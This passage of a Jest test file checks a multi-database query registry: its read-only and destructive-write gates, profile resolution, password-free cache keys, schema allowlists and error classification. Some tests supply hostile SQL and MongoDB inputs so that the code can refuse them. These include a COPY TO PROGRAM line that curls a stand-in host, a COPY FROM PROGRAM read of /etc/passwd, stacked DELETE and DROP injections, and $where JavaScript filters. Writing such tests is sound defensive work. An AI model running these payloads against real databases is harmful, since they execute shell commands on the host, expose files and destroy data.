      expect(adapter.connect).not.toHaveBeenCalled();
      expect(adapter.execute).not.toHaveBeenCalled();
    });

    test('and refuses it in write mode too, where the read-only gate is not running', async () => {
      const adapter = stubAdapter();
      await expect(registryWith(adapter).run('postgres://x', "SELECT $tag$ ' $tag$ ; DELETE FROM users; --", {
        readOnly: false,
        allowDestructive: true
      })).rejects.toThrow(/Multiple statements/);
      expect(adapter.execute).not.toHaveBeenCalled();
    });
  });

  describe('code execution is refused in every mode', () => {
    // `readOnly:false` opts in to modify data, not to run code on the database
    // host, so this gate runs in write mode too.
    test.each([
      "COPY t TO PROGRAM 'curl http://evil.test/$(whoami)'",
      "COPY t FROM PROGRAM 'cat /etc/passwd'",
      'DO $$ BEGIN PERFORM pg_sleep(0); END $$',
      'DO LANGUAGE plpgsql $$ DECLARE x int; BEGIN END $$'
    ])('refuses %p with readOnly:false and allowDestructive:true', async (query) => {
      const adapter = stubAdapter();
      await expect(
        registryWith(adapter).run('postgres://x', query, { readOnly: false, allowDestructive: true })
      ).rejects.toThrow(/shell command on the database host|anonymous code block/);
      expect(adapter.connect).not.toHaveBeenCalled();
    });

    test('refuses a MongoDB $where filter with writes enabled', async () => {
      const adapter = stubAdapter();
      await expect(
        registryWith(adapter, ['mongodb']).run('mongodb://x', '{"$where":"this.a == 1"}', {
          collection: 'c', readOnly: false, allowDestructive: true
        })
      ).rejects.toThrow(/server-side JavaScript/);
      expect(adapter.connect).not.toHaveBeenCalled();
    });

    test('refuses a MongoDB $function inside a pipeline with writes enabled', async () => {
      const adapter = stubAdapter();
      await expect(
        registryWith(adapter, ['mongodb']).run(
          'mongodb://x',
          '[{"$addFields":{"f":{"$function":{"body":"function(){}","args":[],"lang":"js"}}}}]',
          { collection: 'c', action: 'aggregate', readOnly: false, allowDestructive: true }
        )
      ).rejects.toThrow(/server-side JavaScript/);
    });

    test('a $where filter in read-only mode reports both verdicts', async () => {
      await expect(
        registryWith(stubAdapter(), ['mongodb']).run('mongodb://x', '{"$where":"1"}', { collection: 'c' })
      ).rejects.toThrow(/Read-only mode.*also refused in every mode.*JavaScript/s);
    });

    test('a plain write is still allowed, so the check is not simply refusing writes', async () => {
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ affectedRows: 1 }]) });
      await expect(
        registryWith(adapter).run('postgres://x', 'UPDATE t SET a = 1', { readOnly: false })
      ).resolves.toBeDefined();
    });

    test('the refusal explains that the database role is the real control', async () => {
      await expect(
        registryWith(stubAdapter()).run('postgres://x', 'DO $$ BEGIN END $$', { readOnly: false })
      ).rejects.toThrow(/database role/);
    });
  });

  describe('the destructive second gate', () => {
    test.each(['postgres', 'mysql', 'sqlite'])(
      'refuses DDL on %s with only readOnly:false', async (scheme) => {
        const adapter = stubAdapter();
        await expect(
          registryWith(adapter, [scheme]).run(`${scheme}://x`, 'DROP TABLE users', { readOnly: false })
        ).rejects.toThrow(/destructive/i);
        expect(adapter.connect).not.toHaveBeenCalled();
      }
    );

    test('allows DDL with both flags on the call', async () => {
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ affectedRows: 0 }]) });
      const envelope = await registryWith(adapter).run('postgres://x', 'CREATE INDEX ix ON t (a)', {
        readOnly: false, allowDestructive: true
      });
      expect(envelope.truncated).toBe(false);
    });

    test('refuses DDL with allowDestructive but readOnly left on', async () => {
      await expect(
        registryWith(stubAdapter()).run('postgres://x', 'DROP TABLE users', { allowDestructive: true })
      ).rejects.toThrow(/Read-only mode/);
    });

    test('allows DDL when the profile policy grants it', async () => {
      const { store } = profileStore({
        profiles: {
          admin: {
            driver: 'postgres',
            uri: 'postgres://app@db.example.com:5432/mydb',
            readOnly: false,
            allowDestructive: true
          }
        }
      });
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ affectedRows: 0 }]) });
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' }, profiles: store });
      r.mapping = { postgres: () => adapter };

      await expect(r.run({ profile: 'admin' }, 'DROP TABLE users')).resolves.toBeDefined();
    });

    test('refuses DDL when the profile only grants writes', async () => {
      const { store } = profileStore({
        profiles: {
          writer: {
            driver: 'postgres',
            uri: 'postgres://app@db.example.com:5432/mydb',
            readOnly: false
          }
        }
      });
      const adapter = stubAdapter();
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' }, profiles: store });
      r.mapping = { postgres: () => adapter };

      await expect(r.run({ profile: 'writer' }, 'DROP TABLE users')).rejects.toThrow(/destructive/i);
      expect(adapter.connect).not.toHaveBeenCalled();
    });

    test('allows DDL when ANYDB_ALLOW_DESTRUCTIVE=1', async () => {
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ affectedRows: 0 }]) });
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_DESTRUCTIVE: '1' } });
      r.mapping = { postgres: () => adapter };

      await expect(
        r.run('postgres://x', 'DROP TABLE users', { readOnly: false })
      ).resolves.toBeDefined();
    });

    test('refuses a Mongo write action without both flags', async () => {
      const adapter = stubAdapter();
      await expect(
        registryWith(adapter, ['mongodb']).run('mongodb://x', '{"a":1}', {
          collection: 'c', action: 'insert', readOnly: false
        })
      ).rejects.toThrow(/destructive/i);
    });

    test('allows a Mongo delete with both flags', async () => {
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ deletedCount: 1 }]) });
      await expect(
        registryWith(adapter, ['mongodb']).run('mongodb://x', '{"a":1}', {
          collection: 'c', action: 'delete', readOnly: false, allowDestructive: true
        })
      ).resolves.toBeDefined();
    });

    test('the refusal says the two flags are a weak boundary', async () => {
      await expect(
        registryWith(stubAdapter()).run('postgres://x', 'DROP TABLE users', { readOnly: false })
      ).rejects.toThrow(/weak boundary/);
    });
  });

  describe('profile resolution', () => {
    test('refuses both profile and uri, naming both', async () => {
      await expect(registry.run({ profile: 'prod', uri: 'postgres://x/d' }, 'SELECT 1'))
        .rejects.toThrow(/Both "profile" \("prod"\) and "uri" were supplied/);
    });

    test('refuses neither, naming both', async () => {
      await expect(registry.run({}, 'SELECT 1'))
        .rejects.toThrow(/no "profile" and no "uri"/);
    });

    test('refuses an ad-hoc uri when ANYDB_ALLOW_ADHOC_URI=0', async () => {
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_ADHOC_URI: '0' } });
      await expect(r.run('postgres://db.example.com/d', 'SELECT 1'))
        .rejects.toThrow(/ANYDB_ALLOW_ADHOC_URI=0/);
      await expect(r.run('postgres://db.example.com/d', 'SELECT 1'))
        .rejects.toThrow(/db\.json/);
    });

    test('allows an ad-hoc uri by default', async () => {
      const adapter = stubAdapter();
      const r = registryWith(adapter);
      await expect(r.run('postgres://x', 'SELECT 1')).resolves.toBeDefined();
    });

    test('resolves a profile to its connection string', async () => {
      const { store } = profileStore({
        profiles: { prod: { driver: 'postgres', uri: 'postgres://app@db.example.com:5432/mydb' } }
      });
      const adapter = stubAdapter();
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' }, profiles: store });
      r.mapping = { postgres: () => adapter };

      const envelope = await r.run({ profile: 'prod' }, 'SELECT 1');
      expect(adapter.connect).toHaveBeenCalledWith('postgres://app@db.example.com:5432/mydb');
      expect(envelope.profile).toBe('prod');
      expect(envelope.driver).toBe('postgres');
    });

    test('accepts profile as a tool argument', async () => {
      const { store } = profileStore({
        profiles: { prod: { driver: 'postgres', uri: 'postgres://app@db.example.com/mydb' } }
      });
      const adapter = stubAdapter();
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' }, profiles: store });
      r.mapping = { postgres: () => adapter };

      await expect(r.run(undefined, 'SELECT 1', { profile: 'prod' })).resolves.toBeDefined();
    });

    test('a profile policy readOnly:true refuses a write with no per-call flag', async () => {
      const { store } = profileStore({
        profiles: { ro: { driver: 'postgres', uri: 'postgres://app@db.example.com/mydb', readOnly: true } }
      });
      const adapter = stubAdapter();
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' }, profiles: store });
      r.mapping = { postgres: () => adapter };

      await expect(r.run({ profile: 'ro' }, 'DELETE FROM t')).rejects.toThrow(/Read-only mode/);
    });

    test('a per-call readOnly:false overrides a profile readOnly:true', async () => {
      const { store } = profileStore({
        profiles: { ro: { driver: 'postgres', uri: 'postgres://app@db.example.com/mydb', readOnly: true } }
      });
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ affectedRows: 1 }]) });
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' }, profiles: store });
      r.mapping = { postgres: () => adapter };

      await expect(r.run({ profile: 'ro' }, 'DELETE FROM t', { readOnly: false }))
        .resolves.toBeDefined();
    });

    test('a profile policy maxRows clamps the result', async () => {
      const { store } = profileStore({
        profiles: { small: { driver: 'postgres', uri: 'postgres://app@db.example.com/mydb', maxRows: 2 } }
      });
      const adapter = stubAdapter({
        execute: jest.fn().mockResolvedValue(Array.from({ length: 20 }, (_, i) => ({ i })))
      });
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' }, profiles: store });
      r.mapping = { postgres: () => adapter };

      const envelope = await r.run({ profile: 'small' }, 'SELECT 1');
      expect(envelope.rowCount).toBe(2);
      expect(envelope.truncated).toBe(true);
    });

    test('a profile queryTimeoutMs becomes the per-call timeout', async () => {
      const { store } = profileStore({
        profiles: { fast: { driver: 'postgres', uri: 'postgres://app@db.example.com/mydb', queryTimeoutMs: 7777 } }
      });
      const adapter = stubAdapter();
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' }, profiles: store });
      r.mapping = { postgres: () => adapter };

      await r.run({ profile: 'fast' }, 'SELECT 1');
      expect(adapter.execute).toHaveBeenCalledWith('SELECT 1', expect.objectContaining({ timeout: 7777 }));
    });

    test('resolveTarget returns the uri, the policy and the profile name', async () => {
      const { store } = profileStore({
        profiles: { prod: { driver: 'postgres', uri: 'postgres://app@db.example.com/mydb' } }
      });
      const r = new AdapterRegistry({ env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' }, profiles: store });

      const target = await r.resolveTarget({ profile: 'prod' }, { query: 'DROP TABLE t' });
      expect(target.uri).toBe('postgres://app@db.example.com/mydb');
      expect(target.profileName).toBe('prod');
      expect(target.policy.destructive).toBe(true);
      expect(target.options.protocol).toBe('postgres');
    });

    test('a missing profile is a validation error with a code', async () => {
      const { store } = profileStore({ profiles: { prod: { driver: 'sqlite', path: './a.db' } } });
      const r = new AdapterRegistry({ profiles: store });
      await expect(r.run({ profile: 'nope' }, 'SELECT 1')).rejects.toMatchObject({
        kind: 'validation',
        code: 'PROFILE_UNAVAILABLE'
      });
    });

    test('listProfiles returns the store list, with no credentials in it', async () => {
      const { store } = profileStore({
        default: 'prod',
        profiles: {
          prod: { driver: 'postgres', uri: 'postgres://app:s3cret@db.example.com/mydb', description: 'live' },
          ro: { driver: 'sqlite', path: './a.db' }
        }
      });
      const r = new AdapterRegistry({ profiles: store });

      const listed = r.listProfiles();
      expect(listed.map((p) => p.name)).toEqual(['prod', 'ro']);
      expect(JSON.stringify(listed)).not.toContain('s3cret');
      expect(JSON.stringify(listed)).not.toContain('db.example.com');
    });
  });

  describe('cache key', () => {
    test('postgres and postgresql share a pool', () => {
      expect(normaliseCacheKey('postgres://u:p@h:5432/d', 'postgres'))
        .toBe(normaliseCacheKey('postgresql://u:p@h:5432/d', 'postgresql'));
    });

    test('mysql and mysql+pymysql share a pool, and so do mariadb', () => {
      expect(normaliseCacheKey('mysql://u:p@h/d', 'mysql'))
        .toBe(normaliseCacheKey('mysql+pymysql://u:p@h/d', 'mysql+pymysql'));
      expect(normaliseCacheKey('mysql://u:p@h/d', 'mysql'))
        .toBe(normaliseCacheKey('mariadb://u:p@h/d', 'mariadb'));
    });

    test('mongodb and mongodb+srv share a pool', () => {
      expect(normaliseCacheKey('mongodb://u:p@h/d', 'mongodb'))
        .toBe(normaliseCacheKey('mongodb+srv://u:p@h/d', 'mongodb+srv'));
    });

    test('different hosts do not', () => {
      expect(normaliseCacheKey('postgres://u:p@one/d', 'postgres'))
        .not.toBe(normaliseCacheKey('postgres://u:p@two/d', 'postgres'));
      expect(normaliseCacheKey('postgres://u:p@h:5432/d', 'postgres'))
        .not.toBe(normaliseCacheKey('postgres://u:p@h:5433/d', 'postgres'));
    });

    test('different databases on one host do not', () => {
      expect(normaliseCacheKey('postgres://u:p@h/one', 'postgres'))
        .not.toBe(normaliseCacheKey('postgres://u:p@h/two', 'postgres'));
    });

    // The key is not the raw URI: that would hold the plaintext password in a Map
    // for the whole idle TTL.
    test('the key contains no plaintext password', () => {
      const key = normaliseCacheKey('postgres://app:s3cret-pw@db.example.com:5432/mydb', 'postgres');
      expect(key).not.toContain('s3cret-pw');
      expect(key).not.toContain('app');
      expect(key).not.toContain('db.example.com');
      expect(key).not.toContain('mydb');
    });

    test('a rotated password produces a different key, so the old pool is not reused', () => {
      expect(normaliseCacheKey('postgres://app:old@db.example.com/mydb', 'postgres'))
        .not.toBe(normaliseCacheKey('postgres://app:new@db.example.com/mydb', 'postgres'));
    });

    test('the key names the driver and a digest, nothing else', () => {
      expect(normaliseCacheKey('postgres://u:p@h/d', 'postgres')).toMatch(/^postgres::[0-9a-f]{32}$/);
      expect(normaliseCacheKey('mariadb://u:p@h/d', 'mariadb')).toMatch(/^mysql::[0-9a-f]{32}$/);
    });

    test('two calls through the registry really do share one connection', async () => {
      const adapter = stubAdapter();
      const r = registryWith(adapter);
      await r.run('postgres://u:p@h/d', 'SELECT 1');
      await r.run('postgres://u:p@h/d', 'SELECT 2');
      expect(adapter.connect).toHaveBeenCalledTimes(1);
      expect(r.cache.size).toBe(1);
    });
  });

  describe('allowedSchemas and allowedTables', () => {
    const run = (query, options) => registryWith(stubAdapter()).run('postgres://x', query, options);

    test('accepts a table in an allowed schema', async () => {
      await expect(run('SELECT * FROM app.users', { allowedSchemas: ['app'] })).resolves.toBeDefined();
    });

    test('refuses a table in another schema', async () => {
      await expect(run('SELECT * FROM secrets.api_keys', { allowedSchemas: ['app'] }))
        .rejects.toThrow(/only allows the schemas app/);
    });

    test('refuses an unqualified name, and says why', async () => {
      // It resolves against whatever search_path says, which this cannot read.
      await expect(run('SELECT * FROM users', { allowedSchemas: ['app'] }))
        .rejects.toThrow(/not schema-qualified/);
      await expect(run('SELECT * FROM users', { allowedSchemas: ['app'] }))
        .rejects.toThrow(/app\.users/);
    });

    test('refuses a table outside allowedTables', async () => {
      await expect(run('SELECT * FROM app.users', { allowedTables: ['orders'] }))
        .rejects.toThrow(/only allows the tables orders/);
    });

    test('accepts a table listed as schema.table', async () => {
      await expect(run('SELECT * FROM app.users', { allowedTables: ['app.users'] })).resolves.toBeDefined();
    });

    test('checks every reference, including joins', async () => {
      await expect(run('SELECT 1 FROM app.users JOIN secrets.sessions ON 1=1', { allowedSchemas: ['app'] }))
        .rejects.toThrow(/secrets\.sessions/);
    });

    test('checks writes too', async () => {
      await expect(run('DELETE FROM secrets.sessions', {
        allowedSchemas: ['app'], readOnly: false
      })).rejects.toThrow(/secrets\.sessions/);
    });

    test('a table name inside a string literal is not a reference', async () => {
      await expect(run("SELECT * FROM app.users WHERE note = 'secrets.sessions'", { allowedSchemas: ['app'] }))
        .resolves.toBeDefined();
    });

    // A dollar-quoted body may hold an *unquoted* `'`, so a scanner that opened a
    // literal there found no partner and swallowed the rest of the statement: the
    // real `FROM secrets` was never scanned. The quote need not be balanced.
    test.each([
      "SELECT 1 FROM ok WHERE a = $t$ ' $t$ AND b = (SELECT 1 FROM secrets)",
      'SELECT 1 FROM ok WHERE a = $t$ " $t$ AND b = (SELECT 1 FROM secrets)',
    ])('a table reference behind a dollar-quoted body is still a reference: %p', async (query) => {
      await expect(run(query, { allowedTables: ['ok'] })).rejects.toThrow(/secrets/);
    });

    // A reference genuinely inside the body stays invisible: that is why the
    // literal is stripped rather than scanned.
    test('but a table name inside a balanced dollar-quoted body is not a reference', async () => {
      await expect(run('SELECT 1 FROM ok WHERE a = $t$ FROM secrets $t$', { allowedTables: ['ok'] }))
        .resolves.toBeDefined();
    });

    test('quoted identifiers are compared with the quotes stripped', async () => {
      await expect(run('SELECT * FROM "app"."users"', { allowedSchemas: ['app'], allowedTables: ['users'] }))
        .resolves.toBeDefined();
      await expect(run('SELECT * FROM `app`.`users`', { allowedSchemas: ['app'] })).resolves.toBeDefined();
      await expect(run('SELECT * FROM [app].[users]', { allowedSchemas: ['app'] })).resolves.toBeDefined();
    });

    test('case is compared case-insensitively, as unquoted SQL folds', async () => {
      await expect(run('SELECT * FROM APP.USERS', { allowedSchemas: ['app'] })).resolves.toBeDefined();
    });

    test('does not apply to MongoDB or Redis', async () => {
      await expect(
        registryWith(stubAdapter(), ['mongodb']).run('mongodb://x', '{}', {
          collection: 'c', allowedSchemas: ['app']
        })
      ).resolves.toBeDefined();
    });

    // A scan of the statement text, not a parse tree: anything that is not an
    // identifier in that text is invisible to it.
    test('a table named in a comment is not seen, which is the documented limit', () => {
      const cleaned = stripLiterals('SELECT * FROM app.users /* FROM app.secrets */', false);
      expect(collectTableReferences(cleaned).map((r) => r.text)).toEqual(['app.users']);
    });

    test('a subquery is followed, because its own FROM is found', () => {
      const cleaned = stripLiterals('SELECT * FROM (SELECT id FROM app.users) x', false);
      expect(collectTableReferences(cleaned).map((r) => r.text)).toEqual(['app.users']);
    });

    test('a MySQL conditional comment is stripped rather than read', () => {
      const cleaned = stripLiterals('SELECT 1 /*!50000 , (SELECT 1 FROM secrets.t) */', true);
      expect(cleaned).not.toContain('secrets');
    });

    test('the refusal is a policy error with a code', async () => {
      await expect(run('SELECT * FROM secrets.t', { allowedSchemas: ['app'] })).rejects.toMatchObject({
        kind: 'policy',
        code: 'SCHEMA_NOT_ALLOWED'
      });
    });

    // `assertSqlAllowlist` opens with `if (!isSqlProtocol(protocol)) return`, so a
    // scheme `safety.js` does not list skips the allowlist entirely. Asserted
    // twice: through `run()`, which collapses the scheme with `driverFor()`
    // first, and against the public method with the raw scheme a library
    // consumer would hand it.
    test('a MariaDB connection is checked against allowedSchemas and allowedTables', async () => {
      const mariadbSchemes = ['mariadb', 'mariadb+pymysql', 'mariadb+mariadbconnector', 'mysql'];
      for (const uri of ['mariadb://x', 'mariadb+pymysql://x', 'mariadb+mariadbconnector://x', 'mysql://x']) {
        const r = registryWith(stubAdapter(), mariadbSchemes);

        await expect(r.run(uri, 'SELECT * FROM secrets.api_keys', { allowedSchemas: ['app'] }))
          .rejects.toMatchObject({ kind: 'policy', code: 'SCHEMA_NOT_ALLOWED' });
        await expect(r.run(uri, 'SELECT * FROM app.users', { allowedSchemas: ['app'] }))
          .resolves.toBeDefined();
        await expect(r.run(uri, 'SELECT * FROM app.sessions', { allowedTables: ['users'] }))
          .rejects.toMatchObject({ kind: 'policy', code: 'TABLE_NOT_ALLOWED' });

        // The method itself, with the scheme a caller would hand it.
        expect(() => r.assertSqlAllowlist('SELECT * FROM secrets.t', uri.split('://')[0], {
          allowedSchemas: ['app']
        })).toThrow(/only allows the schemas app/);
      }
    });

    test('the gate still does not run for a scheme that is not SQL', () => {
    // The other half of the same check, so the assertion above cannot be satisfied
    // by dropping the guard entirely.
      const r = registryWith(stubAdapter());
      expect(() => r.assertSqlAllowlist('DROP TABLE secrets.t', 'mongodb', { allowedSchemas: ['app'] })).not.toThrow();
      expect(() => r.assertSqlAllowlist('FLUSHDB', 'redis', { allowedSchemas: ['app'] })).not.toThrow();
      expect(() => r.assertSqlAllowlist('GET secrets.t', 'redis-cluster', { allowedSchemas: ['app'] })).not.toThrow();
    });

    test('a MariaDB literal is scanned with backslash escapes, like MySQL', () => {
      // The scanner comes from `driverFor(protocol)`, which is `mysql` for the
      // whole family: a reference named *inside* a MariaDB literal is not a
      // reference, and reading it as one would refuse a legal statement.
      const r = registryWith(stubAdapter());
      expect(() => r.assertSqlAllowlist(
        "SELECT * FROM app.users WHERE note = 'secrets.t\\'; DROP TABLE secrets.x; --'",
        'mariadb',
        { allowedTables: ['users'] }
      )).not.toThrow();
    });
  });

  describe('the single-document MongoDB actions', () => {
    const run = (action, extra = {}) => registryWith(stubAdapter(), ['mongodb']).run(
      'mongodb://x', '{"a":1}', { collection: 'c', action, ...extra }
    );

    // Both halves are asserted — accepted, and still treated as writes — because a
    // write action that stopped being treated as a write is a worse bug than one
    // that was never exposed.
    test.each(['updateOne', 'replace', 'deleteOne'])(
      '%s is accepted and reaches the adapter',
      async (action) => {
        const adapter = stubAdapter();
        const r = registryWith(adapter, ['mongodb']);
        // Both gates: `classifiesAsDestructive` counts every MongoDB write as
        // destructive, so `allowDestructive` is needed as well as `readOnly: false`.
        await expect(r.run('mongodb://x', '{"a":1}', {
          collection: 'c', action, readOnly: false, allowDestructive: true
        })).resolves.toBeDefined();
        expect(adapter.execute).toHaveBeenCalledWith(
          '{"a":1}',
          expect.objectContaining({ action, collection: 'c' })
        );
      }
    );

    test.each(['updateOne', 'replace', 'deleteOne'])(
      '%s is refused in read-only mode',
      async (action) => {
        await expect(run(action)).rejects.toMatchObject({ kind: 'policy', code: 'READ_ONLY' });
      }
    );

    test.each(['updateOne', 'replace', 'deleteOne'])(
      '%s needs the destructive second gate, like insert and delete',
      async (action) => {
        // `classifiesAsDestructive` keeps its own action list, so an action added to
        // `MONGO_ACTIONS` and not there would run a write behind `readOnly: false`
        // alone.
        await expect(run(action, { readOnly: false }))
          .rejects.toMatchObject({ kind: 'policy', code: 'DESTRUCTIVE' });
        await expect(run(action, { readOnly: false, allowDestructive: true })).resolves.toBeDefined();
      }
    );

    test('an action that does not exist is still an argument error, and names the ones that do', () => {
      const r = registryWith(stubAdapter(), ['mongodb']);
      expect(() => r.validateQuery('{}', 'mongodb', { collection: 'c', action: 'drop' }))
        .toThrow(/Unknown MongoDB action/);
      expect(() => r.validateQuery('{}', 'mongodb', { collection: 'c', action: 'drop' }))
        .toThrow(/updateOne/);
    });

    test('the explain action is a read, and it needs a collection', async () => {
    // `db_explain`'s MongoDB branch needs both `collection` and a known action, so
    // both are checked here at the registry boundary, not only in `core/tools.js`.
      const r = registryWith(stubAdapter(), ['mongodb']);
      const adapter = stubAdapter();
      const wired = registryWith(adapter, ['mongodb']);

      await expect(wired.run('mongodb://x', '{"a":1}', { collection: 'c', action: 'explain' }))
        .resolves.toBeDefined();
      expect(adapter.execute).toHaveBeenCalledWith('{"a":1}', expect.objectContaining({ action: 'explain' }));

      expect(() => r.validateQuery('{}', 'mongodb', {})).toThrow(/Missing 'collection'/);
    });

    test('an explain is a read, so it does not need the destructive gate', async () => {
    // `classifiesAsDestructive` counts writes and `explain` is in the read set, so
    // this must not need `allowDestructive` to plan a query.
      await expect(registryWith(stubAdapter(), ['mongodb'])
        .run('mongodb://x', '{"a":1}', { collection: 'c', action: 'explain', readOnly: true }))
        .resolves.toBeDefined();
    });

    test('the multi-statement scan still runs, and the collection is still required', () => {
      const r = registryWith(stubAdapter(), ['mongodb']);
      expect(() => r.validateQuery('{}', 'mongodb', { collection: 'c' })).not.toThrow();
      expect(() => r.validateQuery('{}', 'mongodb', {})).toThrow(/Missing 'collection'/);
    });
  });

  describe('error classification', () => {
    test('a refused statement carries kind, code and operation', async () => {
      await expect(registryWith(stubAdapter()).run('postgres://x', 'DROP TABLE t'))
        .rejects.toMatchObject({ kind: 'policy', code: 'READ_ONLY', operation: 'db_query' });
    });

    test('a driver error is a database error and keeps its code', async () => {
      const failure = Object.assign(new Error('no such table: t'), { code: '42P01' });
      const adapter = stubAdapter({ execute: jest.fn().mockRejectedValue(failure) });
      await expect(registryWith(adapter).run('postgres://x', 'SELECT * FROM t')).rejects.toMatchObject({
        kind: 'database',
        code: '42P01',
        operation: 'db_query',
        driver: 'postgres'
      });
    });

    test('a TimeoutError is a timeout error and reports the budget', async () => {
      const adapter = stubAdapter({ execute: jest.fn(() => new Promise(() => {})) });
      const error = await errorFrom(registryWith(adapter).run('postgres://x', 'SELECT 1', { timeout: 60 }));
      expect(error.kind).toBe('timeout');
      // `TimeoutError` builds its own `operation` label, so it arrives as
      // "db_query (postgres)" rather than the bare tool name.
      expect(error.operation).toMatch(/^db_query/);
    });

    test('a TypeError is a serialization error, not a syntax error', async () => {
      const adapter = stubAdapter({
        execute: jest.fn().mockRejectedValue(new TypeError('Do not know how to serialize a BigInt'))
      });
      await expect(registryWith(adapter).run('postgres://x', 'SELECT 1')).rejects.toMatchObject({
        kind: 'serialization'
      });
    });

    test('a circular-structure TypeError is a serialization error', () => {
      expect(isSerializationError(new TypeError('Converting circular structure to JSON'))).toBe(true);
    });

    test('isTimeoutError recognises a timeout by its class or its code, never its wording', () => {
    // `callbackWithTimeout` throws a plain `Error`, so the SQLite case is the one
    // that could regress here: without a real `TimeoutError` a timeout is
    // reported as "Check the sqlite syntax".
      expect(isTimeoutError(new TimeoutError('sqlite query', 200))).toBe(true);
      expect(isTimeoutError(Object.assign(new Error('x'), { name: 'TimeoutError' }))).toBe(true);
      expect(isTimeoutError(Object.assign(new Error('x'), { code: 'ETIMEDOUT' }))).toBe(true);

      // The rewritten server-side timeouts, one link down the `cause` chain,
      // which is where the adapters keep the code.
      const rewritten = (code) => new Error('[driver] Query exceeded 30000ms', {
        cause: Object.assign(new Error('the driver said so'), { code })
      });
      expect(isTimeoutError(rewritten('57014'))).toBe(true);
      expect(isTimeoutError(rewritten('ER_QUERY_TIMEOUT'))).toBe(true);
      expect(isTimeoutError(rewritten(50))).toBe(true);
      expect(isTimeoutError(Object.assign(new Error('x'), { code: 'SQLITE_INTERRUPT' }))).toBe(true);

      // And the two that must not move: a message that merely mentions timing is
      // not a timeout, and a genuine statement error is not one either.
      expect(isTimeoutError(new Error('no such table: t'))).toBe(false);
      expect(isTimeoutError(new Error('SQLite query exceeded 200ms timeout. Locked.'))).toBe(false);
      expect(isTimeoutError(new Error('column "timeout" does not exist'))).toBe(false);
      expect(isTimeoutError(null)).toBe(false);
    });

    test('the SQLite timeout is recognised because it is a TimeoutError, on the real code path', async () => {
    // The real `callbackWithTimeout` with the real message `sqlite.js` passes,
    // and the real `describeError`.
      const error = await callbackWithTimeout(
        () => {},
        30,
        'SQLite query',
        'SQLite query exceeded 30ms timeout. The database is probably locked by another process.'
      ).catch((err) => err);

      expect(error).toBeInstanceOf(TimeoutError);
      expect(isTimeoutError(error)).toBe(true);
      expect(isDeadConnectionError(error)).toBe(true);
      // A rebuild by `describeError` that kept the class is still a timeout; one
      // that dropped it is not, which is why `describeError` returns it as-is.
      expect(isTimeoutError(new SQLiteAdapter().describeError(error))).toBe(true);
    });

    test('a driver code survives the trip out of an adapter, as cause and as code', async () => {
    // `classifyError` reads the chain, so a PostgreSQL `57014` reaches the caller as
    // `error.code` even though `postgres.js` replaced the error object.
      const driverError = Object.assign(new Error('canceling statement due to statement timeout'), { code: '57014' });
      const rewritten = new PostgresAdapter().describeError(driverError, 30000);
      expect(rewritten.code).toBeUndefined();

      const classified = classifyError(rewritten, { operation: 'db_query', driver: 'postgres' });
      expect(classified.code).toBe('57014');
      expect(classified.kind).toBe('timeout');
      expect(classified.operation).toBe('db_query');
    });

    test('classifyError leaves a kind that is already set alone', () => {
      const error = classifyError(registryError('x', { kind: 'policy' }), { operation: 'db_query' });
      expect(error.kind).toBe('policy');
    });

    test('suggestionFor has text for every kind, and none of it blames the SQL for a result it could not encode', () => {
      for (const kind of ERROR_KINDS) {
        const text = suggestionFor({ kind }, { driver: 'postgres' });
        expect(typeof text).toBe('string');
        expect(text.length).toBeGreaterThan(10);
      }
      expect(suggestionFor({ kind: 'serialization' })).toMatch(/driver or result-type problem/);
      expect(suggestionFor({ kind: 'database' }, { driver: 'sqlite' })).toMatch(/Check the sqlite syntax/);
      expect(suggestionFor({ kind: 'timeout' })).toMatch(/add a LIMIT/);
    });

    test('isDeadConnectionError ignores an error with nothing to say', () => {
      expect(isDeadConnectionError(null)).toBe(false);
      expect(isDeadConnectionError(new Error('no such table: t'))).toBe(false);
    });
  });

  describe('describeConfiguration / health', () => {
    test('reports profiles, cache, drivers and a masked environment', () => {
      const { store, file } = profileStore({
        profiles: { prod: { driver: 'postgres', uri: 'postgres://app:s3cret@db.example.com/mydb' } }
      });
      const r = new AdapterRegistry({
        env: {
          ANYDB_ALLOW_ADHOC_URI: '0',
          ANYDB_KEYCHAIN_CMD: 'op read op://vault/db/password',
          ANYDB_ALLOWED_HOSTS: 'db.example.com'
        },
        profiles: store
      });

      const report = r.describeConfiguration();

      expect(report.profiles).toBe(1);
      expect(report.profilesSource).toBe(file);
      expect(report.cache).toEqual({
        enabled: true, size: 0, pending: 0, maxEntries: 8, idleTtlMs: expect.any(Number)
      });
      expect(Object.keys(report.drivers).sort()).toEqual(['mongodb', 'mysql', 'postgres', 'redis', 'sqlite']);
      expect(report.drivers.sqlite.module).toBe('sqlite3');
      expect(report.drivers.sqlite).toHaveProperty('binding');
      expect(report.env.ANYDB_ALLOW_ADHOC_URI).toBe('0');
      expect(report.env.ANYDB_ALLOWED_HOSTS).toBe('db.example.com');
      expect(report.env.ANYDB_KEYCHAIN_CMD).toBe('***');
      expect(report.env.ANYDB_MAX_ROWS).toBeNull();

      // No credential material of any kind.
      const text = JSON.stringify(report);
      expect(text).not.toContain('s3cret');
      expect(text).not.toContain('db.example.com/');
      expect(text).not.toContain('op://');
    });

    test('reports every documented environment variable', () => {
      const report = new AdapterRegistry({ env: {} }).describeConfiguration();
      for (const name of REPORTED_ENV) expect(report).toHaveProperty(`env.${name}`);
    });

    test('health() is the same report', () => {
      const r = new AdapterRegistry({ env: {} });
      expect(r.health()).toEqual(r.describeConfiguration());
    });

